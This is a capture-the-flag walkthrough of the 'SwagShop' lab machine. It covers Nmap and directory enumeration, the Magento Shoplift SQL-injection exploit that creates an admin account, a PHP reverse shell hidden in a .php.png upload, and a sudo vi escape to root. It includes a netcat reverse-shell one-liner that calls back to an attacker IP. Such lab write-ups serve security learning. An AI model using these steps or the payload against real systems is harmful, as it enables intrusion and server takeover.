### NMAP

As usual we always start with **Nmap** scanning:

<pre>root@pentestbox:~# nmap -sC -sV -oA swag 10.10.10.140

# Nmap 7.70 scan initiated Thu May 16 14:35:32 2019 as: nmap -sC -sV -p- -oA swag 10.10.10.140

It seems that apparently only port 80 looks intersting, let's look what shows.

Appartently looks like a Magento installation.

![](/images/swagshop/port_80.png)

Let's use dirb as usual to scan some interesting files.

### DirBuster

With dirbuster and big.txt wordlist we found some interesting file such as:

<pre>
File found: /index.php - 200
Dir found: /css/ - 200
File found: /app/etc/local.xml
</pre>

Looking at local.xml it seems that there are some mysql creds which we are gonna keep it if 
required

<pre>

root

</pre>


So let's try to see if there is something intersting on magento, which is a know CMS for e-commerce solutions.

I know magescan, which is a tool to perform enumeration on such CMS, but apperently not interesting results
it found:

![](/images/swagshop/magescan.png)

So next step is to try to see if there is some knon exploits on this versions, which btw magento showed be  1.9.0.0, 1.9.0.1 

### Exploits

After few research on searchsploit and exploit-db i've found one which seems intersting. 

It's a SQL Injection on a admin path **/admin/Cms_Wysiwyg/directive/index/**, and the PoC of the exploit create a new user with
admin privileges as pointed out by the exploit

<pre>
##################################################################################################
#Exploit Title : Magento Shoplift exploit (SUPEE-5344)
#Author        : Manish Kishan Tanwar AKA error1046
#Date          : 25/08/2015
#Love to       : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Jagriti,Kishan Singh and ritu rathi

#////////////////////////
#/// Overview:
#////////////////////////
#
#Magento shoplift bug originally discovered by CheckPoint team (http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/)
#This python script developed by joren but it was having some bug because of which it was not working properly.
#If magento version is vulnerable, this script will create admin account with username forme and password forme
</pre>

The exploit worked! we just needed to change the url base from "http://10.10.10.140" to "http://10.10.10.140/index.php" because
it seems that mode_rewrite url is working.

So that's it!

<pre>

python 37977.py
WORKED
Check http://10.10.10.140/index.php/admin with creds forme:forme
</pre>

We can now go the admin login page and login with creds forme:forme

An this is the admin panel

## Reverse Shell

We can now upload a reverse shell using the connection instance manager of Magento.

i've used LavaMagentoBD project which does exactly this, so i don't need to create
a package from scratch.

***DAMN! the vuln has been patched so we have to find another way!***

Surfing the wev i've found this amazing article with another workaround about magento.

https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper

So i follow the steps i suggest.

First of all with the admin creds i allow the simlink options

System –> Configuration **THEN** Advanced –> Developer **THEN** Template Settings –> Allow Symlinks 

![](/images/swagshop/allow.png)

Magento it should add a warning, no probl of course.

Then we use a random .png image and we inject this php shell, renmaing also the png with php double extension shell.php.png

<pre>

echo '< ?php' >> shell.php.png
echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.42 1337 >/tmp/f");' >> shell.php.png
echo '?>' >> shell.php.png

</pre>


So now we have to create a new thumbnail category so:

Catalog –> Manage Categories **THEN** a new one, then you give it a new, you abilitate it and then you add as a thumbnail your image:


So now finally, we can run our reverse shell.

All we need to do it's to go to the newsletter template, create a new one with the payload, and then preview it!

Catalog –> Manage Categories

And then the payload shell.php.png

Save it, and the preview it, and we have our reverse shell!


# ROOT

## Enumeration

Immediatly after we launched linenum we noticed somenthing strange in the sudoers file.

![](/images/swagshop/sudoers.png)


We are apparently able to exec as www-data /usr/bin/vi for every file in /var/www/html/

So, we can simply open with sudo a file in that folder, and exec bash from vi and .. that's it!

![](/images/swagshop/root.png)


We have a root shell!
